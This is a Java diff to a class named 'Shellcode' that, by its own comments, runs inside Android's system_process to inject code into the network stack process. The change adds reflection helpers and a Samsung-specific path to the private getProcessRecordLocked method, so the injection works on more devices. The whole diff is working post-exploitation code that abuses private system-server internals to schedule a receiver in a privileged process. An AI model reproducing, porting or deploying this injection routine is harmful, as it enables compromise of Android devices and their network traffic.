@@ -45,6 +45,29 @@ public class Shellcode extends BroadcastReceiver {
         }
     }
 
+    /** Declared-field lookup that walks superclasses (Samsung subclasses framework classes). */
+    private static Field findField(Class<?> cls, String name) throws NoSuchFieldException {
+        for (Class<?> c = cls; c != null; c = c.getSuperclass()) {
+            try {
+                return c.getDeclaredField(name);
+            } catch (NoSuchFieldException ignored) {
+            }
+        }
+        throw new NoSuchFieldException(name);
+    }
+
+    /** Declared-method lookup that walks superclasses. */
+    private static Method findMethod(Class<?> cls, String name, Class<?>... params)
+            throws NoSuchMethodException {
+        for (Class<?> c = cls; c != null; c = c.getSuperclass()) {
+            try {
+                return c.getDeclaredMethod(name, params);
+            } catch (NoSuchMethodException ignored) {
+            }
+        }
+        throw new NoSuchMethodException(name);
+    }
+
     /**
      * To be executed in system_process process, to inject code into network stack
      */
@@ -62,14 +85,31 @@ public class Shellcode extends BroadcastReceiver {
             ClassLoader classLoader = activityManagerService.getClass().getClassLoader();
             @SuppressLint("PrivateApi")
             Class<?> ActivityManagerService = classLoader.loadClass("com.android.server.am.ActivityManagerService");
-            Method getProcessRecordLocked = ActivityManagerService.getDeclaredMethod("getProcessRecordLocked", String.class, int.class);
-            getProcessRecordLocked.setAccessible(true);
             Object networkStackProcessRecord;
+            Class<?> processRecordClass;
             synchronized (activityManagerService) {
-                networkStackProcessRecord = getProcessRecordLocked.invoke(
-                        activityManagerService, "com.android.networkstack.process", NETWORK_STACK_UID);
+                try {
+                    Method m = ActivityManagerService.getDeclaredMethod(
+                            "getProcessRecordLocked", String.class, int.class);
+                    m.setAccessible(true);
+                    networkStackProcessRecord = m.invoke(
+                            activityManagerService, "com.android.networkstack.process", NETWORK_STACK_UID);
+                    processRecordClass = m.getReturnType();
+                } catch (NoSuchMethodException aospMissing) {
+                    /* Samsung (h8q): AMS has no delegate; ProcessList owns
+                     * getProcessRecordLocked(int, String) — swapped arg order. */
+                    Field plField = findField(ActivityManagerService, "mProcessList");
+                    plField.setAccessible(true);
+                    Object processList = plField.get(activityManagerService);
+                    Method m = findMethod(processList.getClass(),
+                            "getProcessRecordLocked", int.class, String.class);
+                    m.setAccessible(true);
+                    networkStackProcessRecord = m.invoke(
+                            processList, NETWORK_STACK_UID, "com.android.networkstack.process");
+                    processRecordClass = m.getReturnType();
+                }
             }
-            Method getOnewayThread = getProcessRecordLocked.getReturnType().getDeclaredMethod("getOnewayThread");
+            Method getOnewayThread = findMethod(processRecordClass, "getOnewayThread");
             getOnewayThread.setAccessible(true);
             IApplicationThread appThread = (IApplicationThread) getOnewayThread.invoke(networkStackProcessRecord);
             appThread.scheduleReceiver(intent, receiverInfo, null, 0,
